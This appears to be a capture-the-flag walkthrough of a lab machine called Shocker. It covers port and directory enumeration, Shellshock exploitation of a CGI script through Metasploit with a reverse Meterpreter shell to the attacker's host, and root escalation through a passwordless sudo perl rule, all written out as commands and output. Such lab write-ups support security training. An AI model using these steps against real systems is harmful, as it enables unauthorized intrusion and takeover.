# Shocker

## Information gathering

### Nmap scanning

```

sudo nmap -Pn -sS -sC 10.10.10.56

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 02:23 EDT
Nmap scan report for 10.10.10.56
Host is up (0.85s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  EtherNetIP-1
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)

Nmap done: 1 IP address (1 host up) scanned in 39.38 seconds
```

lets scan port 2222 for more information

```
            nmap -A -p 2222 10.10.10.56
            
            Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 02:27 EDT
            Nmap scan report for 10.10.10.56
            Host is up (0.64s latency).

            PORT     STATE SERVICE VERSION
            2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
            | ssh-hostkey: 
            |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
            |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
            |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

            Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
            Nmap done: 1 IP address (1 host up) scanned in 28.26 seconds
```

### WhatWeb

```

whatweb http://10.10.10.56

http://10.10.10.56 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.56]
```

### GoBuster 

```

gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/05 02:31:10 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/cgi-bin/             (Status: 403) [Size: 294]
/index.html           (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 299]
                                               
===============================================================
2021/07/05 02:36:40 Finished
===============================================================
```

lets check __/cgi-bin/__ directory for php or py or sh files

```

              gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirb/common.txt -x php,sh,py
              
              ===============================================================
              Gobuster v3.1.0
              by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
              ===============================================================
              [+] Url:                     http://10.10.10.56/cgi-bin
              [+] Method:                  GET
              [+] Threads:                 10
              [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
              [+] Negative Status codes:   404
              [+] User Agent:              gobuster/3.1.0
              [+] Extensions:              php,sh,py
              [+] Timeout:                 10s
              ===============================================================
              2021/07/05 03:46:08 Starting gobuster in directory enumeration mode
              ===============================================================
              /.hta                 (Status: 403) [Size: 298]
              ****************** NOT SO IMPORTANT *********************
              /.htpasswd.sh         (Status: 403) [Size: 306]
              /user.sh              (Status: 200) [Size: 118]
                                               
              ===============================================================
              2021/07/05 04:06:33 Finished
              ===============================================================
```               

we can check for  __shellshock__ bug

## Gaining access and Exploitation

### Metasploit

__Checking for shellshock__

```

search shellshock

Matching Modules
================

   #   Name                                               Disclosure Date  Rank       Check  Description
   -   ----                                               ---------------  ----       -----  -----------
   0   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   1   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   2   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   ------------------------------ -                   ---------------------------------------------------- - ------------------------------ ------------
   10  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
   11  exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution


Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/misc/xdh_x_exec
```

in order to check whether we can perform shellshock, we are going to use 2

```

msf6 > use 2

msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set rhosts 10.10.10.56
rhosts => 10.10.10.56
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set targeturi /cgi-bin/user.sh
targeturi => /cgi-bin/user.sh
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > run

[+] uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > 
```

hence we can use shellshock to gain shell

__Shellshock to gain access__

we are going to use 1 to get shell

```

msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp

msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhosts 10.10.10.56
rhosts => 10.10.10.56
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/user.sh
targeturi => /cgi-bin/user.sh
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhost 10.10.16.195
lhost => 10.10.16.195
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lport 9003
lport => 9003
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 10.10.16.195:9003 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (984904 bytes) to 10.10.10.56
[*] Meterpreter session 1 opened (10.10.16.195:9003 -> 10.10.10.56:59088) at 2021-07-05 04:47:25 -0400

meterpreter > pwd
/usr/lib/cgi-bin
meterpreter > cd /home
meterpreter > ls
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2017-09-22 15:49:12 -0400  shelly

meterpreter > cd shelly
meterpreter > cat user.txt
******************************
```

In order to check for privilege, let use shell

```

meterpreter > shell
Process 5305 created.
Channel 2 created.

ls
user.txt
python3 -c "import pty; pty.spawn('/bin/sh')"
$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
$ sudo perl -e 'exec "/bin/sh";'    
sudo perl -e 'exec "/bin/sh";'
# cat /root/root.txt
cat /root/root.txt
********************************
# 
```


